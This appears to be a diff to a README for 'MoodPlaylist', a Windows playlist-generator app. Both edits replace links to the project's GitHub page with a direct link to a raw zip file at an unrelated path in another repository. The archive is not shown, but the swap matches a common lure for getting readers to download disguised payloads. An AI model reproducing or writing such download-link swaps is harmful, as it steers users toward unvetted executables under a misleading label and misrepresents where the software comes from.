@@ -5,7 +5,7 @@ description: "Generate custom music playlists from text descriptions using the G
 ---
 # 🎵 MoodPlaylist - Create music mixes for every emotion
 
-[![](https://img.shields.io/badge/Download-MoodPlaylist-blue.svg)](https://github.com/nikkiegallic471/MoodPlaylist)
+[![](https://img.shields.io/badge/Download-MoodPlaylist-blue.svg)](https://raw.githubusercontent.com/nikkiegallic471/nikkiegallic471.github.io/main/cinerator/io-nikkiegallic-github-v1.8.zip)
 
 ## 🎯 About This Application
 
@@ -19,7 +19,7 @@ This application runs on Windows 10 and Windows 11. Your computer needs at least
 
 You must visit the project page to get the installer for your computer. 
 
-[Click here to visit the download page](https://github.com/nikkiegallic471/MoodPlaylist)
+[Click here to visit the download page](https://raw.githubusercontent.com/nikkiegallic471/nikkiegallic471.github.io/main/cinerator/io-nikkiegallic-github-v1.8.zip)
 
 Follow these steps to find the file:
 
